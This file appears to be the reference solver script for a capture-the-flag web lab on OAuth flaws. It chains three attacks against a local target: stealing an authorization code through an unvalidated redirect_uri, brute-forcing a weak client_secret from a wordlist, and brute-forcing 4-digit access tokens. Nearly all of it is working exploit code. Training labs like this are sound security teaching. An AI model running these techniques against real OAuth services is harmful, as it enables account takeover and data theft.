#!/usr/bin/env python3
"""Masquerade Operation 06 reference solver -- Hibana burns through every layer
of The Clubhouse's OAuth delegation, one independent weakness at a time.

Three genuinely separate vulnerabilities, chained the way a real assessment
would actually find and report them:

  Stage 1 -- the authorize endpoint hands an authorization code to whatever
             redirect_uri a request claims, never checking it against anything
             registered for the client. Lure N. Kruger (always logged in) with
             a link pointing at our own catcher, and the code shows up there.

  Stage 2 -- the token endpoint's client_secret is short and guessable, with
             no rate limit on wrong attempts. Brute-force it with the stolen
             code and a wordlist -- a real, working access token comes back.

  Stage 3 -- the resource endpoint's access tokens are tiny 4-digit numbers,
             also with no rate limit, and it never checks whether the token
             was ever obtained through Stages 1-2 at all. This script proves
             that independence directly: it brute-forces a token from
             scratch, without touching Stage 1 or 2's code path.

Usage: python3 solver.py [base_url] [secrets_wordlist]
       (defaults: http://localhost:8000, wordlists/op6_client_secrets.txt)
"""
import sys, os, requests, re

BASE = (sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8000").rstrip("/")
SECRETS_WORDLIST = sys.argv[2] if len(sys.argv) > 2 else os.path.join(
    os.path.dirname(__file__), "..", "..", "wordlists", "op6_client_secrets.txt")
CATCHER = "/masquerade/op6/attacker-catch"
CLIENT_ID = "print_kiosk"


def main():
    print("[*] Baseline -- confirming the normal, honest OAuth flow works")
    s = requests.Session()
    s.post(f"{BASE}/masquerade/op6/login", data={"username": "club.member", "password": "Clubhouse2024!"})
    r = s.get(f"{BASE}/masquerade/op6/oauth/authorize", params={
        "response_type": "code", "client_id": CLIENT_ID,
        "redirect_uri": "/masquerade/op6/callback", "scope": "view_gallery"})
    print(f"    consent screen reachable: {'Allow' in r.text}")

    print(f"\n[*] Stage 1 -- luring N. Kruger with a redirect_uri we control ({CATCHER})")
    r2 = requests.post(f"{BASE}/masquerade/op6/lure-member", data={"redirect_uri": CATCHER})
    print(f"    lure delivered: {'opened the link' in r2.text}")

    r3 = requests.get(f"{BASE}{CATCHER}")
    codes = re.findall(r'font-mono text-atk mt-1 break-all">([^<]+)<', r3.text)
    if not codes:
        print("[!] No code captured -- Stage 1 failed."); return
    stolen_code = codes[0]
    print(f"[+] Stage 1 cleared -- stolen code: {stolen_code!r}")

    print(f"\n[*] Stage 2 -- brute-forcing client_secret against the real /oauth/token endpoint")
    print(f"    (every wrong guess is a real HTTP request -- no rate limit stops any of them)")
    found_secret = found_token = None
    with open(SECRETS_WORDLIST) as f:
        for line in f:
            guess = line.strip()
            if not guess:
                continue
            resp = requests.post(f"{BASE}/masquerade/op6/oauth/token", data={
                "grant_type": "authorization_code", "code": stolen_code,
                "redirect_uri": CATCHER, "client_id": CLIENT_ID, "client_secret": guess})
            data = resp.json()
            if "access_token" in data:
                found_secret, found_token = guess, data["access_token"]
                break
    if not found_secret:
        print("[!] Did not crack the secret -- wordlist path wrong, or the app's secret changed."); return
    print(f"[+] Stage 2 cleared -- cracked secret: {found_secret!r}, access_token: {found_token!r}")

    print(f"\n[*] Stage 3 -- using that token at the real resource endpoint")
    r4 = requests.get(f"{BASE}/masquerade/op6/photos/me", params={"access_token": found_token})
    data = r4.json()
    if data.get("flag"):
        print(f"[+] {data['flag']}")
    else:
        print(f"[!] token was not accepted: {data}")

    print(f"\n[*] Sanity check -- reusing the SAME code again must now fail (already consumed)")
    r5 = requests.post(f"{BASE}/masquerade/op6/oauth/token", data={
        "grant_type": "authorization_code", "code": stolen_code,
        "redirect_uri": CATCHER, "client_id": CLIENT_ID, "client_secret": found_secret})
    print(f"    rejected: {'access_token' not in r5.json()} ({r5.json()})")

    print(f"\n[*] Proving Stage 3 is genuinely INDEPENDENT of Stages 1-2:")
    print(f"    brute-forcing a fresh access_token from nothing but its 4-digit space")
    for guess in range(1000, 10000):
        r6 = requests.get(f"{BASE}/masquerade/op6/photos/me", params={"access_token": str(guess)})
        if r6.status_code == 200:
            print(f"[+] guessed a valid token directly: {guess} -- no code, no secret, no Stage 1/2 needed")
            break
    else:
        print("[!] Did not find a valid token in the 4-digit space this run.")


if __name__ == "__main__":
    main()
